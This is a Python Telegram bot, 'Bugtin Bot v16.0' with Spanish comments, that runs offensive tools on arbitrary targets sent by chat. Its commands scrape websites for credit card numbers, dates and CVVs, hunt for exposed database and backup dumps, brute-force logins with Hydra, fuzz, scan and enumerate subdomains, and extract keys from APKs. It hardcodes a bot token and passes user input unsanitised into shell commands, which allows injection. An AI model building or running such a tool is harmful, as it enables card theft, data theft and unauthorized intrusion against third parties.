import telebot
from telebot import types
import subprocess
import os
import time
import re
import threading

# --- CONFIGURACIÓN ---
TOKEN = "8760818918:AAEPZfrcH5L5qVLHymarv0e-IfljRfyb9rY"
YOUR_CHAT_ID = "6280594821"

bot = telebot.TeleBot(TOKEN)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# --- DICCIONARIOS INTELIGENTES ---
def obtener_wordlist_combinada():
    archivos_objetivo = ["common.txt", "logins.txt", "api-routes.txt", "tecnico.txt"]
    combinado_path = os.path.join(BASE_DIR, "master_wordlist.txt")
    with open(combinado_path, "w") as outfile:
        outfile.write("database\nsql\nbackup\nusers\nconfig\n")
        for nombre in archivos_objetivo:
            path = os.path.join(BASE_DIR, nombre)
            if os.path.exists(path):
                with open(path, "r") as infile:
                    outfile.write(infile.read() + "\n")
    return combinado_path

# --- UTILIDADES ---
def ejecutar_en_hilo(func, message):
    thread = threading.Thread(target=func, args=(message,))
    thread.start()

def enviar_archivo_seguro(chat_id, ruta, caption):
    for _ in range(15):
        if os.path.exists(ruta) and os.path.getsize(ruta) > 0:
            break
        time.sleep(1)
    if os.path.exists(ruta) and os.path.getsize(ruta) > 0:
        try:
            with open(ruta, "rb") as f:
                bot.send_document(chat_id, f, caption=caption, parse_mode="Markdown")
            os.remove(ruta)
        except Exception as e:
            bot.send_message(chat_id, f"❌ Error de envío: {str(e)}")
    else:
        if os.path.exists(ruta): os.remove(ruta)
        bot.send_message(chat_id, "⚠️ No se encontraron datos o el objetivo está protegido.")

# --- COMANDOS DE EXTRACCIÓN (NUEVOS) ---

@bot.message_handler(commands=['buscar_cc'])
def start_cc_search(message):
    msg = bot.send_message(message.chat.id, "💳 **Introduce la URL para buscar Tarjetas (CC/Fecha/CVV):**")
    bot.register_next_step_handler(msg, lambda m: ejecutar_en_hilo(process_cc_web, m))

def process_cc_web(message):
    url = message.text.strip()
    path = os.path.join(BASE_DIR, f"cc_web_{int(time.time())}.txt")
    bot.send_message(message.chat.id, "💳 Rastreando la web en busca de patrones de tarjetas...")
    # Usamos Katana para extraer todo el contenido y JS, luego grep para CCs
    regex_cc = r'[3-5][0-9]{12,15}|[0-9]{2}/[0-9]{2,4}|cvv[":\s]+[0-9]{3,4}'
    cmd = f"katana -u {url} -silent -d 3 -jc | xargs curl -s | grep -E -o '{regex_cc}' > {path}"
    subprocess.run(cmd, shell=True)
    enviar_archivo_seguro(message.chat.id, path, f"💳 Reporte de Tarjetas en Web: `{url}`")

@bot.message_handler(commands=['buscar_db'])
def start_db_search(message):
    msg = bot.send_message(message.chat.id, "🗄️ **URL para buscar Bases de Datos (.sql, .xls):**")
    bot.register_next_step_handler(msg, lambda m: ejecutar_en_hilo(process_db_search, m))

def process_db_search(message):
    url = message.text.strip()
    path = os.path.join(BASE_DIR, f"db_res_{int(time.time())}.txt")
    bot.send_message(message.chat.id, "🔍 Buscando archivos de base de datos y backups...")
    cmd = f"gobuster dir -u {url} -w {obtener_wordlist_combinada()} -x sql,db,bak,xls,xlsx,csv -o {path} -k --no-error"
    subprocess.run(cmd, shell=True)
    enviar_archivo_seguro(message.chat.id, path, f"🗄️ Archivos DB encontrados: `{url}`")

# --- TODOS LOS COMANDOS ANTERIORES ---

@bot.message_handler(commands=['subs'])
def process_subs_cmd(message):
    msg = bot.send_message(message.chat.id, "📡 **Dominio:**")
    bot.register_next_step_handler(msg, lambda m: ejecutar_en_hilo(do_subs, m))

def do_subs(message):
    target = message.text.strip().lower().replace("https://", "").replace("http://", "").split("/")[0]
    path = os.path.join(BASE_DIR, f"subs_{target}.txt")
    bot.send_message(message.chat.id, f"📡 Extrayendo subdominios...")
    subprocess.run(f"subfinder -d {target} -silent -all > {path}", shell=True)
    enviar_archivo_seguro(message.chat.id, path, f"🏁 Subdominios: `{target}`")

@bot.message_handler(commands=['dir'])
def process_dir_cmd(message):
    msg = bot.send_message(message.chat.id, "📂 **URL:**")
    bot.register_next_step_handler(msg, lambda m: ejecutar_en_hilo(do_dir, m))

def do_dir(message):
    url = message.text.strip()
    path = os.path.join(BASE_DIR, f"dir_{int(time.time())}.txt")
    subprocess.run(f"gobuster dir -u {url} -w {obtener_wordlist_combinada()} -x php,js,txt -o {path} -k --no-error", shell=True)
    enviar_archivo_seguro(message.chat.id, path, f"📂 Directorios: `{url}`")

@bot.message_handler(commands=['apk'])
def process_apk_cmd(message):
    msg = bot.send_message(message.chat.id, "📱 **Sube el APK:**")
    bot.register_next_step_handler(msg, lambda m: ejecutar_en_hilo(do_apk, m))

def do_apk(message):
    if not message.document: return
    file_info = bot.get_file(message.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    local = os.path.join(BASE_DIR, "temp.apk")
    report = os.path.join(BASE_DIR, "apk_secrets.txt")
    with open(local, 'wb') as f: f.write(downloaded)
    regex = r'http[s]?://[^\s\'"]+|[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|AIza[0-9A-Za-z-_]{35}'
    subprocess.run(f"strings '{local}' | grep -E '{regex}' > '{report}'", shell=True)
    if os.path.exists(local): os.remove(local)
    enviar_archivo_seguro(message.chat.id, report, "📱 Secretos APK")

@bot.message_handler(commands=['fuerza'])
def process_hydra_cmd(message):
    msg = bot.send_message(message.chat.id, "⚡ **[IP] [Servicio] [User]**")
    bot.register_next_step_handler(msg, lambda m: ejecutar_en_hilo(do_hydra, m))

def do_hydra(message):
    try:
        ip, svc, usr = message.text.split()
        report = os.path.join(BASE_DIR, "hydra.txt")
        subprocess.run(f"hydra -l {usr} -P passwords.txt {ip} {svc} -o {report}", shell=True)
        enviar_archivo_seguro(message.chat.id, report, f"⚡ Hydra: `{ip}`")
    except: bot.send_message(message.chat.id, "❌ Error formato.")

@bot.message_handler(commands=['fuzz'])
def process_fuzz_cmd(message):
    msg = bot.send_message(message.chat.id, "🔍 **URL con FUZZ:**")
    bot.register_next_step_handler(msg, lambda m: ejecutar_en_hilo(do_fuzz, m))

def do_fuzz(message):
    url = message.text.strip()
    path = os.path.join(BASE_DIR, "fuzz.txt")
    subprocess.run(f"ffuf -u {url} -w {obtener_wordlist_combinada()} -mc 200,403 -o {path}", shell=True)
    enviar_archivo_seguro(message.chat.id, path, "🔍 Fuzzing")

@bot.message_handler(commands=['auditar'])
def process_audit_cmd(message):
    msg = bot.send_message(message.chat.id, "🔓 **URL:**")
    bot.register_next_step_handler(msg, lambda m: ejecutar_en_hilo(do_audit, m))

def do_audit(message):
    target = message.text.strip()
    path = os.path.join(BASE_DIR, "audit.txt")
    subprocess.run(f"nuclei -u {target} -silent -o {path}", shell=True)
    enviar_archivo_seguro(message.chat.id, path, "📄 Auditoría")

@bot.message_handler(commands=['crawl'])
def process_crawl_cmd(message):
    msg = bot.send_message(message.chat.id, "🕸️ **URL:**")
    bot.register_next_step_handler(msg, lambda m: ejecutar_en_hilo(do_crawl, m))

def do_crawl(message):
    target = message.text.strip()
    path = os.path.join(BASE_DIR, "crawl.txt")
    subprocess.run(f"katana -u {target} -silent -o {path}", shell=True)
    enviar_archivo_seguro(message.chat.id, path, "🕸️ Crawling")

@bot.message_handler(commands=['help', 'start'])
def send_help(message):
    if str(message.chat.id) == YOUR_CHAT_ID:
        menu = (
            "🚀 **Bugtin Bot v16.0 Ultimate**\n\n"
            "💳 `/buscar_cc` - Busca CC/Fecha/CVV en la Web\n"
            "🗄️ `/buscar_db` - Busca .sql, .xls y backups\n"
            "📡 `/subs` - Subdominios\n"
            "📂 `/dir` - Directorios\n"
            "📱 `/apk` - Analizar APK\n"
            "⚡ `/fuerza` - Hydra\n"
            "🔍 `/fuzz` - FFUF\n"
            "🔓 `/auditar` - Nuclei\n"
            "🕸️ `/crawl` - Katana"
        )
        bot.send_message(message.chat.id, menu, parse_mode="Markdown")

if __name__ == "__main__":
    print("🚀 Bugtin Bot v16.0 Online - Modo Ultimate")
    bot.polling(none_stop=True)
